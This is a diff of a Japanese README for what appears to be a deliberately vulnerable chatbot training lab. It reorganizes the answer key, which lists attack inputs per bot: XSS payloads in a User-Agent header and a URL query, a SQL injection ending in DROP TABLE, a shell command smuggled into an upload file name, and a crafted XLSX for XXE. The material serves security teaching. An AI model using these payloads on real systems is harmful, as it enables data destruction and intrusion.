@@ -50,29 +50,22 @@ $ ./add-users.sh -f /tmp/user.csv -i 192.168.1.x
 
 ---
 
-# 回答
+<details>
 
-### URLリンク作成 Bot [XSS]
+<summary>問題の回答</summary>
 
-以下の入力を行いEnter
+### Echo Bot [XSS]
+
+ブラウザのDeveloper ToolでUser Agentを下記のように変更。
 ```
-url=javascript:alert()
-label=hoge
+"><img src=x onerror="alert()"><!--
 ```
 
-### FizzBuzz Bot [XSS]
-
-https://192.168.1.x?q=%3Cimg%20src=%22x%22%20onerror=%22alert()%22%3E
-
-というようなURLにアクセスし。
-
-以下の入力を行いEnter
-```
-n=200
-```
+そして、適当なメッセージを入力し送信する。
 
 ### アーティスト検索 Bot [SQL Injection]
 
+下記のメッセージを入力し送信する。
 ```
 search=santana
 n='; DROP TABLE user; --
@@ -83,6 +76,15 @@ n='; DROP TABLE user; --
 アップロードする画像のファイル名を例えば以下に変え、アップロードする。
 ```
 example`sleep 3`.jpg
+```
+
+### FizzBuzz Bot [XSS]
+
+https://192.168.1.x?q=%3Cimg%20src=%22x%22%20onerror=%22alert()%22%3E
+
+というようなURLにアクセスした上で、下記メッセージを入力し送信する。
+```
+n=200
 ```
 
 ### Excel解析 Bot [XXE]
@@ -126,4 +128,6 @@ $ zip -r crafted.xlsx '[Content_Types].xml' _rels xl
   adding: xl/sharedStrings.xml (deflated 26%)
 ```
 
-crafted.xlsxをアップロードする。
+そして、crafted.xlsxをアップロードする。
+
+</details>
